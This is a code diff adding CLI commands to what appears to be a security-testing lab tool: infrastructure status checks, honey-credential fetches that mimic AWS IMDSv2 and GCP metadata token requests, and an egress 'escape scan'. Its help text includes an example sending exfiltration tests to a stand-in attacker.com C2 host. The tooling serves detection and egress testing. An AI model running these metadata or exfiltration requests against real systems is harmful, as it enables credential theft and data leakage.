@@ -431,4 +431,287 @@ Usage:
   $ apparatus labs ai-chat "cat config.php" -s linux_terminal
 `);
     });
+
+  // ============================================================================
+  // Infrastructure Commands
+  // ============================================================================
+
+  const infra = labs
+    .command('infra')
+    .description('Infrastructure probing and status checks');
+
+  // Infrastructure status
+  infra
+    .command('status')
+    .description('Display status of all infrastructure services')
+    .option('--port <port>', 'Filter by port')
+    .option('--protocol <protocol>', 'Filter by protocol: tcp|udp|ws')
+    .action(async (options) => {
+      const client = getClient();
+      const spin = output.spinner('Fetching infrastructure status...');
+      spin.start();
+
+      try {
+        const res = await fetch(`${client.getBaseUrl()}/api/infra/status`);
+        if (!res.ok) throw new Error(`Status ${res.status}`);
+        const data = await res.json() as { success: boolean; servers: Array<{ name: string; protocol: string; port: number; status: string; path?: string }> };
+
+        spin.stop();
+        output.header('Infrastructure Status');
+
+        let servers = data.servers || [];
+        if (options.port) {
+          servers = servers.filter(s => s.port === parseInt(options.port));
+        }
+        if (options.protocol) {
+          servers = servers.filter(s => s.protocol === options.protocol);
+        }
+
+        const rows = servers.map(s => {
+          const statusIcon = s.status === 'active' ? '✓' : s.status === 'disabled' ? '-' : '✗';
+          return [
+            statusIcon,
+            s.name,
+            s.protocol.toUpperCase(),
+            s.port.toString(),
+            s.path || '-',
+            s.status,
+          ];
+        });
+
+        output.printTable(['', 'Service', 'Protocol', 'Port', 'Path', 'Status'], rows);
+      } catch (err) {
+        spin.stop();
+        output.error(`Failed to fetch infrastructure status: ${(err as Error).message}`);
+        process.exit(1);
+      }
+    });
+
+  // Infrastructure imposter status
+  infra
+    .command('imposter')
+    .description('Check Cloud Imposter infrastructure status')
+    .action(async () => {
+      const client = getClient();
+      const spin = output.spinner('Checking Cloud Imposter status...');
+      spin.start();
+
+      try {
+        const res = await fetch(`${client.getBaseUrl()}/api/infra/imposter`);
+        spin.stop();
+
+        if (res.ok) {
+          const data = await res.json() as Record<string, unknown>;
+          output.header('Cloud Imposter Status');
+          output.success('✓ Cloud Imposter is ONLINE');
+          output.subheader('\nDetails:');
+          output.printJson(data);
+        } else {
+          output.error('✗ Cloud Imposter returned error');
+          const data = await res.json();
+          output.printJson(data);
+          process.exit(1);
+        }
+      } catch (err) {
+        spin.stop();
+        output.error(`Cloud Imposter is OFFLINE: ${(err as Error).message}`);
+        output.info('Start with: npm run imposter (in apparatus directory)');
+        process.exit(1);
+      }
+    });
+
+  // Infrastructure sidecar status
+  infra
+    .command('sidecar')
+    .description('Check Toxic Sidecar infrastructure status')
+    .action(async () => {
+      const client = getClient();
+      const spin = output.spinner('Checking Toxic Sidecar status...');
+      spin.start();
+
+      try {
+        const res = await fetch(`${client.getBaseUrl()}/api/infra/sidecar`);
+        spin.stop();
+
+        if (res.ok) {
+          const data = await res.json() as Record<string, unknown>;
+          output.header('Toxic Sidecar Status');
+          output.success('✓ Toxic Sidecar is ONLINE');
+          output.printJson(data);
+        } else {
+          output.error('✗ Toxic Sidecar returned error');
+          const data = await res.json();
+          output.printJson(data);
+          process.exit(1);
+        }
+      } catch (err) {
+        spin.stop();
+        output.error(`Toxic Sidecar is OFFLINE: ${(err as Error).message}`);
+        output.info('Start with: npm run sidecar (in apparatus directory)');
+        process.exit(1);
+      }
+    });
+
+  // ============================================================================
+  // Enhanced Imposter Commands (new organization)
+  // ============================================================================
+
+  const imposter = labs
+    .command('imposter')
+    .description('Cloud credential spoofing and theft simulation');
+
+  // AWS credentials
+  imposter
+    .command('aws')
+    .description('Fetch AWS honey credentials from Cloud Imposter')
+    .option('--port <port>', 'Imposter port', '16925')
+    .option('--role <role>', 'AWS IAM role name', 'imposter-role')
+    .addHelpText('after', `
+Examples:
+  $ apparatus labs imposter aws                    # Get AWS honey creds
+  $ apparatus labs imposter aws --role admin       # Custom role name`)
+    .action(async (options) => {
+      const baseUrl = `http://localhost:${options.port}`;
+      const spin = output.spinner('Fetching AWS honey credentials...');
+      spin.start();
+
+      try {
+        // AWS IMDSv2 flow
+        const tokenRes = await fetch(`${baseUrl}/latest/api/token`, {
+          method: 'PUT',
+          headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' },
+        });
+
+        if (!tokenRes.ok) throw new Error(`Token fetch failed: ${tokenRes.status}`);
+        const token = await tokenRes.text();
+
+        const credsRes = await fetch(`${baseUrl}/latest/meta-data/iam/security-credentials/${options.role}`, {
+          headers: { 'X-aws-ec2-metadata-token': token },
+        });
+
+        if (!credsRes.ok) throw new Error(`Creds fetch failed: ${credsRes.status}`);
+        const creds = await credsRes.json() as AwsCredentialsResponse;
+
+        spin.stop();
+        output.header('AWS Honey Credentials (FAKE)');
+        output.warning('These are honey credentials for detection - NOT real AWS keys!');
+        output.printJson(creds);
+      } catch (err) {
+        spin.stop();
+        output.error(`Failed to fetch AWS credentials: ${(err as Error).message}`);
+        output.info('Ensure Cloud Imposter is running: npm run imposter');
+        process.exit(1);
+      }
+    });
+
+  // GCP credentials
+  imposter
+    .command('gcp')
+    .description('Fetch GCP honey token from Cloud Imposter')
+    .option('--port <port>', 'Imposter port', '16925')
+    .addHelpText('after', `
+Examples:
+  $ apparatus labs imposter gcp                    # Get GCP honey token`)
+    .action(async (options) => {
+      const baseUrl = `http://localhost:${options.port}`;
+      const spin = output.spinner('Fetching GCP honey token...');
+      spin.start();
+
+      try {
+        // GCP metadata flow
+        const res = await fetch(`${baseUrl}/computeMetadata/v1/instance/service-accounts/default/token`, {
+          headers: { 'Metadata-Flavor': 'Google' },
+        });
+
+        if (!res.ok) throw new Error(`Token fetch failed: ${res.status}`);
+        const gcpToken = await res.json() as GcpTokenResponse;
+
+        spin.stop();
+        output.header('GCP Honey Token (FAKE)');
+        output.warning('This is a honey token for detection - NOT a real GCP token!');
+        output.printJson(gcpToken);
+      } catch (err) {
+        spin.stop();
+        output.error(`Failed to fetch GCP token: ${(err as Error).message}`);
+        output.info('Ensure Cloud Imposter is running: npm run imposter');
+        process.exit(1);
+      }
+    });
+
+  // ============================================================================
+  // Enhanced Escape Commands (new organization)
+  // ============================================================================
+
+  const escape = labs
+    .command('escape')
+    .description('Container escape and egress testing');
+
+  // Escape scan
+  escape
+    .command('scan')
+    .description('Run egress firewall scan (Egress Tester)')
+    .option('-t, --target <url>', 'C2 server or target URL for exfil test')
+    .option('-d, --data <string>', 'Data to exfiltrate')
+    .option('--dlp <type>', 'Generate fake sensitive data: cc, ssn, email')
+    .option('--payload <type>', 'Payload type to test')
+    .option('--ports <ports>', 'Ports to test (comma sep)', '80,443,8080,22,21,53')
+    .option('--report', 'Report breaches to Risk Server (Threat Intel)')
+    .addHelpText('after', `
+Examples:
+  $ apparatus labs escape scan                     # Basic scan
+  $ apparatus labs escape scan --dlp cc            # Exfil fake credit card
+  $ apparatus labs escape scan -t https://attacker.com  # Test against C2
+  $ apparatus labs escape scan --payload dns       # Test DNS exfiltration
+  $ apparatus labs escape scan --report            # Report to Threat Intel`)
+    .action(async (options) => {
+      const client = getClient();
+      const spin = output.spinner('Running escape analysis scan...');
+      spin.start();
+
+      try {
+        const ports = options.ports.split(',').map((p: string) => parseInt(p.trim()));
+        const payload: Record<string, unknown> = {
+          target: options.target,
+          data: options.data,
+          dlpType: options.dlp,
+          payloadType: options.payload,
+          ports,
+          report: options.report || false,
+        };
+
+        const res = await fetch(`${client.getBaseUrl()}/api/escape/scan`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) throw new Error(`Status ${res.status}`);
+        const data = await res.json() as EscapeScanResponse;
+
+        spin.stop();
+        output.header('Escape Analysis Results');
+        output.labelValue('Timestamp', data.timestamp);
+        output.labelValue('Payload Type', data.payload_type);
+
+        output.subheader('\nEgress Checks:');
+        for (const check of data.checks) {
+          const icon = check.status === 'success' ? chalk.red('⚠ OPEN') : chalk.green('✓ BLOCKED');
+          console.log(`  ${icon} ${check.method}${check.details ? ` - ${check.details}` : ''}`);
+        }
+
+        const breaches = data.checks.filter(c => c.status === 'success').length;
+        if (breaches > 0) {
+          output.warning(`\n${breaches} egress path(s) detected!`);
+          if (options.report) {
+            output.info('Breach report sent to Risk Server');
+          }
+        } else {
+          output.success('\nNo egress breaches detected');
+        }
+      } catch (err) {
+        spin.stop();
+        output.error(`Escape analysis failed: ${(err as Error).message}`);
+        process.exit(1);
+      }
+    });
 }
